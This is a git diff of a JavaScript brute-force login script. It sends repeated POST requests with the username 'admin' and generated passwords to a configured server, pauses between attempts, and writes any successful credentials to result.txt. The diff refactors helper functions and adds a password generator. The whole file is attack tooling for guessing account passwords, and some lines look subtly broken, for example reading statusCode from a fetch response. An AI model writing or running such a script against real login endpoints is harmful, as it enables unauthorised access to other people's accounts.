@@ -1,18 +1,5 @@
-import fs from "node:fs/promises";
 import config from "./config.json" assert { type: "json" };
-
-function sleep(ms) {
-  return new Promise((resolve) => new setTimeout(resolve, ms));
-}
-
-function writeResult(result) {
-  fs.writeFile("result.txt", result, "a+");
-}
-
-// @todo implement
-function generatePassword() {
-  return "";
-}
+import helpers from "./helpers";
 
 async function main({
   serverURI,
@@ -21,8 +8,10 @@ async function main({
   attemptTimeout = 0,
   maxPassLength,
 }) {
-  if (!attempts) return;
+  if (!attempts) return console.log("No attempts provided");
 
+  const passGen = helpers.createPassGen(chars);
+  // @todo add username generation
   let username = "admin";
   let password = "";
 
@@ -31,8 +20,8 @@ async function main({
   }
 
   try {
-    for (let i = 0; i < attempts; i += 1) {
-      await sleep(attemptTimeout);
+    for (let i = 0; i < attempts; i++) {
+      await helpers.sleep(attemptTimeout);
 
       const response = await fetch(serverURI, {
         method: "POST",
@@ -45,12 +34,17 @@ async function main({
         }),
       }).catch((err) => console.error(err));
 
-      if (response.statusCode === 200) {
-        console.log("> Success <");
-        writeResult(`username: ${username}; password: ${password}`);
+      const SUCCESS_STATUS = 200;
+
+      if (response.statusCode === SUCCESS_STATUS) {
+        console.log("|> Success <|");
+        helpers.writeResult(
+          `username: ${username}; password: ${password}`,
+          "result.txt"
+        );
         break;
       } else {
-        password = generatePassword();
+        password = passGen();
 
         if (password.length >= maxPassLength) {
           console.log("Max pass length exceeded");
